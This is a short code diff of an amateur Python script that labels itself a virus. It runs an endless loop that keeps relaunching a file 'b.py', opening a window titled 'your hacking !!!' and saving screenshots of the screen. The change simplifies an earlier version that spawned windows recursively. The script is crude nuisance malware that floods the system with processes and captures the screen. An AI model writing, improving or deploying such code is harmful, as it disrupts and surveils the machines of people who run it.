@@ -3,31 +3,31 @@ from tkinter import *
 from PIL import ImageGrab
 
 
-os.system('pip install os')
+
+#Install the desired library if a pip is installed on the device.
 os.system('pip install pillow')
-os.system('pip install auto-py-to-exe')
-
-def plus ():
-    while True:
-        os.startfile("b.py")
-        window = Tk()
-        window.title('your hacking !!!')
-        window.minsize(900,800)
-        window.maxsize(900,800)
-        window.resizable(width=False,height=False)
-        Button(window, text='No !!!').pack()
 
 
 
+
+
+
+
+
+
+
+#Virus start
 while True:
     os.startfile("b.py")
-    os.system('auto-py-to-exe')
+
+    #Build window
     window = Tk()
     window.title('your hacking !!!')
     window.minsize(900,800)
     window.maxsize(900,800)
-    window.resizable(width=False,height=False)
-    Button(window, text='your hacking !!!', command=plus).pack()
+    Button(window, text='your hacking !!!').pack()
+    window.mainloop()
+
+    #Take screenshots of the page and save a lot
     sc = ImageGrab.grab()
-    sc.save('your hacking!!!.png')
-#    time.sleep(5)
+    sc.save('your hacking.png')
